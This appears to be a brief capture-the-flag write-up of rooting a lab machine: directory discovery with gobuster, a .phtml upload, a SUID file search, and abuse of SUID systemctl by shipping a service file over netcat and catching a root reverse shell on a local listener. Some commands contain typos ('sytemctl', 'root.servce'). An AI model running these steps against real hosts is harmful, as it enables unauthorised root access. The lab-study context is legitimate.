writeup

`nmap`  didn't show anything usefull
`gobuster` reveiled an /internal/ path, which allowed file upload.

permitted file: .phtml

scan for SUID files (Files that can run as root, without being root)
`find / -user root -perm -4000 -exec ls -ldb {} \;`

$ `/bin/systemctl` 

## Next 
Google for systemctl GTFObin 
https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740

follow the instructions

setup listener in tmp dir
`nc -vl 44444 > root.service`

create local `root.service` file, and paste the exploit.
Project the exploit over netcat

`nc -n <targetip> 44444 < root.service`

Setup local netcat listner to receive shell

`nc -lnvp 9999`

Run the local root.service
note: Path is not set, so systemctl won't run by just calling it `systemctl` or `./systemctl`, the full path must be specified 
`/bin/systemctl enable /tmp/root.servce`
This will create the systemctl symlinks for a root shell

Next, launch the exploit and receive root shell on your local NC
`/bin/sytemctl start root`

That's it
